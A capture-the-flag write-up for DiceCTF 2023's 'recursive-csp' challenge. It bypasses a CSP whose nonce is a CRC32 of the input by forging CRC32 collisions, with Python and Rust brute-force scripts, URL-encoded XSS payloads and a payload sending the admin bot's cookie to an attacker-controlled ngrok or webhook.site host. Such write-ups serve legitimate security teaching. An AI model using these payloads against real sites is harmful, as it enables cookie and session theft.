# recursive-csp

## Overview

- Overall difficulty for me (From 1-10 stars): ★★★★★★★★★☆

- 178 solves / 115 points

## Background

- Author: strellic

the nonce isn't random, so how hard could this be?

(the flag is in the admin bot's cookie)

[recursive-csp.mc.ax](https://recursive-csp.mc.ax)

[Admin Bot](https://adminbot.mc.ax/web-recursive-csp)

## Find the flag

In this challenge, there are 2 websites.

**`recursive-csp.mc.ax`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/DiceCTF-2023/images/Pasted%20image%2020230204121527.png)

**View source page:**
```html
<!DOCTYPE html>
<html>
  <head>
    <title>recursive-csp</title>
  </head>
  <body>
    <h1>Hello, world!</h1>
    <h3>Enter your name:</h3>
    <form method="GET">
      <input type="text" placeholder="name" name="name" />
      <input type="submit" />
    </form>
    <!-- /?source -->
  </body>
</html>
```

In here, we see there is a HTML comment.

The `?source` is the GET parameter.

**Let's try to provide that:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/DiceCTF-2023/images/Pasted%20image%2020230204121632.png)

As you can see, we found the PHP source page.

**Source code:**
```php
<?php
  if (isset($_GET["source"])) highlight_file(__FILE__) && die();

  $name = "world";
  if (isset($_GET["name"]) && is_string($_GET["name"]) && strlen($_GET["name"]) < 128) {
    $name = $_GET["name"];
  }

  $nonce = hash("crc32b", $name);
  header("Content-Security-Policy: default-src 'none'; script-src 'nonce-$nonce' 'unsafe-inline'; base-uri 'none';");
?>
<!DOCTYPE html>
<html>
  <head>
    <title>recursive-csp</title>
  </head>
  <body>
    <h1>Hello, <?php echo $name ?>!</h1>
    <h3>Enter your name:</h3>
    <form method="GET">
      <input type="text" placeholder="name" name="name" />
      <input type="submit" />
    </form>
    <!-- /?source -->
  </body>
</html>
```

Let's break it down!

- If GET parameter `source` is provided, then show the source code of this PHP file and exit the script
- Check GET parameter `name` is provided, and it's data type is string, and the length is less than 128. If no `name` parameter is provided, default one is "world".
- Then, **using hashing algorithm CRC32B to digest (hash) our provided `name` parameter's value**
- After that, add `Content-Security-Policy` (CSP) header to HTTP response header, with value:
    - `default-src 'none'; script-src 'nonce-$nonce' 'unsafe-inline'; base-uri 'none';`
- Finally, echos out our provided `name` parameter's value

**Armed with above information, we can try to provide the `name` GET parameter:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/DiceCTF-2023/images/Pasted%20image%2020230204122605.png)

As you can see, our `name`'s value is being **reflected** to the web page.

That being said, we can try to exploit reflected XSS (Cross-Site Scripting)!

**Payload:**
```html
<script>alert(document.domain)</script>
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/DiceCTF-2023/images/Pasted%20image%2020230204122849.png)

However, the alert box doesn't appear, as the `Content-Security-Policy`'s `script-src` is set to `none`. That being said, the back-end will disallow from executing JavaScript code.

> **Content Security Policy** ([CSP](https://developer.mozilla.org/en-US/docs/Glossary/CSP)) is an added layer of security that helps to detect and mitigate certain types of attacks, including Cross-Site Scripting ([XSS](https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting)) and data injection attacks. These attacks are used for everything from data theft, to site defacement, to malware distribution.

But! ***The `script-src` directive is set to a `nonce` value.***

Also, ***the `script-src` directive also set to `unsafe-inline`, which enables us to execute any inline JavaScript code!***

Hmm... How can we abuse the `nonce` value...

In [Content Security Policy (CSP) Quick Reference Guide](https://content-security-policy.com/nonce/), it said:

![](https://github.com/siunam321/CTF-Writeups/blob/main/DiceCTF-2023/images/Pasted%20image%2020230204124332.png)

As you can see, the nonce's random value must be cryptographically secure random.

In our case, the nonce's value is hashed by our `name` value via CRC32B algorithm.

After poking around, I found an interesting thing.

**we can use the `<meta>` element to redirect users:**
```html
<meta http-equiv="refresh" content="1;url=https://siunam321.github.io/">
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/DiceCTF-2023/images/Pasted%20image%2020230204130948.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/DiceCTF-2023/images/Pasted%20image%2020230204130957.png)

Boom! We can redirect users to any website!

However, that doesn't allow us to steal the admin bot's cookie because of the CORS (Cross-Origin Resource Sharing) policy?

Hmm... What if I **redirect the admin bot to our XSS payload**??

But then it'll be blocked because of the nonce value is incorrect...

**Let's go to the "Admin Bot" page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/DiceCTF-2023/images/Pasted%20image%2020230204144540.png)

In here, we can submit a URL:

![](https://github.com/siunam321/CTF-Writeups/blob/main/DiceCTF-2023/images/Pasted%20image%2020230204144705.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/DiceCTF-2023/images/Pasted%20image%2020230204144709.png)

Burp Suite HTTP history:

![](https://github.com/siunam321/CTF-Writeups/blob/main/DiceCTF-2023/images/Pasted%20image%2020230204144828.png)

When we clicked the "Submit" button, it'll send a POST request to `/web-recursive-csp`, with parameter `url` and `recaptcha_code`.

Then, it'll redirect us to `/web-recursive-csp` with GET parameter `msg` and `url`.

Maybe we could redirect the admin bot to here, and trigger an XSS payload??

But no dice.

**If you look at the source code:**
```php
strlen($_GET["name"]) < 128
```

It checks the string length is less than 128 characters or not. Why it's doing that?

According to [HackTricks](https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass#php-response-buffer-overload), if the response is overflowed (default 4096 bytes), it'll show a warning:

![](https://github.com/siunam321/CTF-Writeups/blob/main/DiceCTF-2023/images/Pasted%20image%2020230204152642.png)

So, maybe the checks is preventing that?

Also, I realized that there is a thing called "Hash collision". For example, MD5 hash collision attack, where 2 MD5 hashes are the same, thus collided.

Since **CRC32B algorithm only outputs a 32-bit unsigned value**, we can very easily to brute force it.

**Let's write a simple Python script to brute force it!**
```py
#!/usr/bin/env python3

from zlib import crc32
from itertools import combinations_with_replacement

characters = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}"
counter = 1

# Hash and loop through aa, ab, ac, ...
while True:
    for character in combinations_with_replacement(characters, counter):
        crc32BeforeHashInput = "".join(character).encode('utf-8')
        crc32BeforeHashed = hex(crc32(crc32BeforeHashInput))[2:]

        crc32HashNonce = f"<script nonce='{crc32BeforeHashed}'>alert(document.domain)</script>".encode('utf-8')
        crc32HashedNonce = hex(crc32(crc32HashNonce))[2:]

        crc32HashPayloadInput = f"<script nonce='{crc32HashedNonce}'>alert(document.domain)</script>".encode('utf-8')
        crc32HashedPayload = hex(crc32(crc32HashPayloadInput))[2:]

        print(f'[*] Trying nonce: {crc32HashedNonce}, hashed: {crc32HashedPayload}', end='\r')

        if crc32HashedPayload == crc32HashedNonce:
            print('\n[+] Found collided hash!')
            print(f'[+] Before hashed 1: {crc32HashNonce.decode()}')
            print(f'[+] Before hashed 2: {crc32HashPayloadInput.decode()}')
            print(f'[+] After hashed 1: {crc32HashedNonce}')
            print(f'[+] After hashed 2: {crc32HashedPayload}')
            # exit()
    else:
        counter += 1
```

**If this script found a collided hash, we could use that nonce value in our XSS payload, as the back-end will also generate the same nonce value!**

However, still no luck????

## After the CTF

After the CTF, I found that there is a [GitHub repository](https://github.com/bediger4000/crc32-file-collision-generator) that generate CRC32 hash collision:

![](https://github.com/siunam321/CTF-Writeups/blob/main/DiceCTF-2023/images/Pasted%20image%2020230206203749.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/DiceCTF-2023/images/Pasted%20image%2020230206203754.png)

**Let's clone that repository!**
```shell
┌[siunam♥earth]-(/opt)-[2023.02.08|17:37:33(HKT)]
└> sudo git clone https://github.com/bediger4000/crc32-file-collision-generator.git
[sudo] password for siunam: 
Cloning into 'crc32-file-collision-generator'...
```

**Then, we can create a `target.txt` for generating the nonce value, and `payload.txt` for the XSS payload:**
```shell
┌[siunam♥earth]-(~/ctf/DiceCTF-2023/Web/recursive-csp)-[2023.02.08|17:38:00(HKT)]
└> echo -n '0' > target.txt
┌[siunam♥earth]-(~/ctf/DiceCTF-2023/Web/recursive-csp)-[2023.02.08|17:41:58(HKT)]
└> /opt/crc32-file-collision-generator/crc32 target.txt                
target.txt, read 1 bytes
	CRC32: f4dbdf21
```

> Note: The `-n` flag must be used to remove the new line character (`\n`).

```shell
┌[siunam♥earth]-(~/ctf/DiceCTF-2023/Web/recursive-csp)-[2023.02.08|17:42:17(HKT)]
└> echo -n '<script nonce="f4dbdf21">alert(document.domain)</script>' > payload.txt
```

> Note: For testing purposes, we can first use `alert()` JavaScript function.

**After that, use `matchfile` to find the collided hash:**
```shell
┌[siunam♥earth]-(~/ctf/DiceCTF-2023/Web/recursive-csp)-[2023.02.08|17:43:01(HKT)]
└> /opt/crc32-file-collision-generator/matchfile target.txt payload.txt
File to match has length 1, CRC32 value f4dbdf21
File to get to match has length 56, CRC32 value 2d0aaf44
Bytes to match: 41db763a
3a 76 db 41 
:v�A
```

Next, URL encode the XSS payload **and the collided bytes**:

```py
#!/usr/bin/env python3

import urllib.parse

def main():
	url = 'https://recursive-csp.mc.ax/?name='
	XSSpayload = ''.join(open('payload.txt', 'r'))
	matchedBytes = '%3a%76%db%41'

	print(f'URL encoded Payload:\n{url}{urllib.parse.quote(XSSpayload)}{matchedBytes}')

if __name__ == '__main__':
	main()
```

```shell
┌[siunam♥earth]-(~/ctf/DiceCTF-2023/Web/recursive-csp)-[2023.02.08|17:51:09(HKT)]
└> python3 url_encode_payload.py
URL encoded Payload:
https://recursive-csp.mc.ax/?name=%3Cscript%20nonce%3D%22f4dbdf21%22%3Ealert%28document.domain%29%3C/script%3E%3a%76%db%41
```

**Finally, copy and paste that URL encoded payload:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/DiceCTF-2023/images/Pasted%20image%2020230208175246.png)

Boom!! We successfully triggered an alert box, as the nonce value is matched!!

**Now, to retrieve admin bot's cookie, we can modify the XSS payload.**

But first, we need to:

**Setup Ngrok HTTP port forwarding and Python Simple HTTP server:** (Or you can just use [Webhook.site](https://webhook.site/))
```shell
┌[siunam♥earth]-(~/ctf/DiceCTF-2023/Web/recursive-csp)-[2023.02.08|17:59:20(HKT)]
└> ngrok http 8000
[...]
Web Interface                 http://127.0.0.1:4040                                                        
Forwarding                    https://2330-{Redacted}.ap.ngrok.io -> http://localhost:8000
[...]
```

```shell
┌[siunam♥earth]-(~/ctf/DiceCTF-2023/Web/recursive-csp)-[2023.02.08|17:59:57(HKT)]
└> python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

**Then we can modify the XSS payload:**
```shell
┌[siunam♥earth]-(~/ctf/DiceCTF-2023/Web/recursive-csp)-[2023.02.08|18:01:03(HKT)]
└> echo -n '<script nonce="f4dbdf21">document.location="https://2330-{Redacted}.ap.ngrok.io?"+document.cookie</script>' > payload.txt
```

> Note: The XSS payload must less than 128 characters, as the web application will check that.

**Again, find the collided bytes:**
```shell
┌[siunam♥earth]-(~/ctf/DiceCTF-2023/Web/recursive-csp)-[2023.02.08|18:02:33(HKT)]
└> /opt/crc32-file-collision-generator/matchfile target.txt payload.txt
File to match has length 1, CRC32 value f4dbdf21
File to get to match has length 110, CRC32 value 43e6a8bd
Bytes to match: 2f3771c3
c3 71 37 2f 
�q7/
```

**URL encode it:**
```py
	matchedBytes = '%c3%71%37%2f'
```

```shell
┌[siunam♥earth]-(~/ctf/DiceCTF-2023/Web/recursive-csp)-[2023.02.08|18:02:57(HKT)]
└> python3 url_encode_payload.py 
URL encoded Payload:
https://recursive-csp.mc.ax/?name=%3Cscript%20nonce%3D%22f4dbdf21%22%3Edocument.location%3D%22https%3A//2330-{Redacted}.ap.ngrok.io%3F%22%2Bdocument.cookie%3C/script%3E%c3%71%37%2f
```

**Finally, send the above URL to [admin bot](https://adminbot.mc.ax/web-recursive-csp):**

![](https://github.com/siunam321/CTF-Writeups/blob/main/DiceCTF-2023/images/Pasted%20image%2020230208180401.png)

**Verify it worked:**
```shell
Web Interface                 http://127.0.0.1:4040                                                        
Forwarding                    https://2330-{Redacted}.ap.ngrok.io -> http://localhost:8000             
                                                                                                           
Connections                   ttl     opn     rt1     rt5     p50     p90                                  
                              1       0       0.01    0.00    0.00    0.00                                 
                                                                                                           
HTTP Requests                                                                                              
-------------                                                                                              
                                                                                                           
GET /                          200 OK
```

```shell
┌[siunam♥earth]-(~/ctf/DiceCTF-2023/Web/recursive-csp)-[2023.02.08|17:59:57(HKT)]
└> python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
127.0.0.1 - - [08/Feb/2023 18:03:49] "GET /?flag=dice{h0pe_that_d1dnt_take_too_l0ng} HTTP/1.1" 200 -
```

Nice! We successfully retrieved admin bot's cookie!!

- **Flag: `dice{h0pe_that_d1dnt_take_too_l0ng}`**

**Alternatively, I modified the brute force script:**
```py
#!/usr/bin/env python3

from zlib import crc32

def main():
    for i in range(0x0, 0xffffffff + 1):
        nonceValue = crc32(bytes(i))

        payload = f'<script nonce="{nonceValue}">document.location="https://webhook.site/9e750b29-46f0-4629-a07c-adeb8a7ed641/?c="+document.cookie</script>'.encode('utf-8')
        hashedPayload = crc32(bytes(payload))

        print(f'[*] Trying nonce {nonceValue}, hashed payload {hashedPayload}', end='\r')

        if hashedPayload == nonceValue:
            print('[+] Found collided hash!')
            print(f'[+] Nonce value: {nonceValue}')
            print(f'[+] Hashed value: {hashedPayload}')
            print(f'[+] Before hashed payload: {payload.decode()}')
            exit()

if __name__ == '__main__':
    main()
```

This script will loop through hex `0x0` to hex `0xffffffff`, which is from 0 to 4294967295. The reason why we loop through that, is because CRC32 is 32-bit long, or 8 hex characters long. Therefore, we can loop through hex `0x0` to hex `0xffffffff`, to get the hash collision value:

```shell
┌[siunam♥earth]-(~/ctf/DiceCTF-2023/Web/recursive-csp)-[2023.02.08|18:06:13(HKT)]
└> python3 brute_force_crc32b.py                                                              
[...]
```

However, using Python to do that would take a very, very long time.

To address this issue, we switch to **Rust**.

> Rust is blazingly fast and memory-efficient: with no runtime or garbage collector, it can power performance-critical services, run on embedded devices, and easily integrate with other languages.

- Initialise a new Rust repository:

```shell
┌[siunam♥earth]-(~/ctf/DiceCTF-2023/Web/recursive-csp)-[2023.02.08|18:24:12(HKT)]
└> cargo init         
     Created binary (application) package
```

- Modfiy the `src/main.rs`: (The following Rust script is from this challenge's author: strellic, I strongly recommend you to read his [writeup](https://brycec.me/posts/dicectf_2023_challenges#recursive-csp)! Kudos to strellic!)

```rust
use rayon::prelude::*;

fn main() {
    let payload = "<script nonce='f4dbdf21'>document.location='https://6466-{Redacted}.ap.ngrok.io?'+document.cookie</script>".to_string();
    let start = payload.find("Z").unwrap();
    (0..=0xFFFFFFFFu32).into_par_iter().for_each(|i| {
        let mut p = payload.clone();
        p.replace_range(start..start+8, &format!("{:08x}", i));
        if crc32fast::hash(p.as_bytes()) == i {
            println!("{} {i} {:08x}", p, i);
        }
    });
}
```

> Note: Replace your call back link to yours. Also, the nonce can be remain unchanged.

> It creates a range from 0 to $2^{32}$, then uses Rayon to parallelize it. Then, it places the iterator value into the nonce, and checks that the output of `crc32fast::hash` is itself the iterator value. (Once again, from this challenge author's [writeup](https://brycec.me/posts/dicectf_2023_challenges#recursive-csp)).

Then compile it, and run the compiled executable.

After you found the collided hash, you can repeat the same step in the first solution.

# Conclusion

What we've learned:

1. XSS (Cross-Site Scripting) & CSP (Content Security Policy) Bypass Via Insecure Nonce Value